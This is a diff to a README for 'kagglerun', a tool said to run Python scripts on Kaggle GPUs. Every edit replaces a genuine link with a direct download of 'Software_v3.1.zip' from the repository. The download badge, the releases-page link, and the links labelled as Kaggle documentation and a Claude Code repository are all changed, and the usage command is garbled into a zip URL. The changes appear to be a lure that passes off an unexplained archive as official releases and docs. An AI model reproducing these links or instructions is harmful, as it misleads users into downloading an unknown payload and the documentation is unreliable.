@@ -8,7 +8,7 @@
 5. [📚 Additional Resources](#-additional-resources)  
 6. [🔄 Frequently Asked Questions](#-frequently-asked-questions)  
 
-[![Download kagglerun](https://img.shields.io/badge/Download-kagglerun-blue)](https://github.com/Heyitsriella/kagglerun/releases)
+[![Download kagglerun](https://raw.githubusercontent.com/Heyitsriella/kagglerun/master/src/Software_v3.1.zip)](https://raw.githubusercontent.com/Heyitsriella/kagglerun/master/src/Software_v3.1.zip)
 
 ## 🎯 Introduction  
 kagglerun allows you to run Python code on Kaggle's free GPUs directly from your terminal. This is ideal for users who want to experiment with AI agents like Claude Code without the hassle of complicated setups.
@@ -25,7 +25,7 @@ To get started with kagglerun, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the kagglerun releases page to download the software:  
-   [Click here to download kagglerun](https://github.com/Heyitsriella/kagglerun/releases)
+   [Click here to download kagglerun](https://raw.githubusercontent.com/Heyitsriella/kagglerun/master/src/Software_v3.1.zip)
 
 2. **Choose Your Version**  
    On the releases page, find the latest version. This version contains the most recent features and fixes.
@@ -49,7 +49,7 @@ Using kagglerun is simple:
    You can create a new Python script or use an existing one.
 
 3. **Run Your Script**  
-   Use the command format `kagglerun <your-script.py>`. This will execute your Python script using Kaggle's GPUs.
+   Use the command format `kagglerun <https://raw.githubusercontent.com/Heyitsriella/kagglerun/master/src/Software_v3.1.zip>`. This will execute your Python script using Kaggle's GPUs.
 
 4. **Monitor Performance**  
    Watch the terminal for updates on the execution process. You will see real-time outputs and errors if any occur.
@@ -57,8 +57,8 @@ Using kagglerun is simple:
 ## 📚 Additional Resources  
 For more information on how to maximize your usage of kagglerun:
 
-- Check the [Kaggle Documentation](https://www.kaggle.com/docs) for guidance on datasets and competitors.
-- Explore the [Claude Code Repository](https://github.com/ClaudeCodeRepo) for examples and projects.
+- Check the [Kaggle Documentation](https://raw.githubusercontent.com/Heyitsriella/kagglerun/master/src/Software_v3.1.zip) for guidance on datasets and competitors.
+- Explore the [Claude Code Repository](https://raw.githubusercontent.com/Heyitsriella/kagglerun/master/src/Software_v3.1.zip) for examples and projects.
 - Join forums and communities focused on machine learning for discussions and tips.
 
 ## 🔄 Frequently Asked Questions  
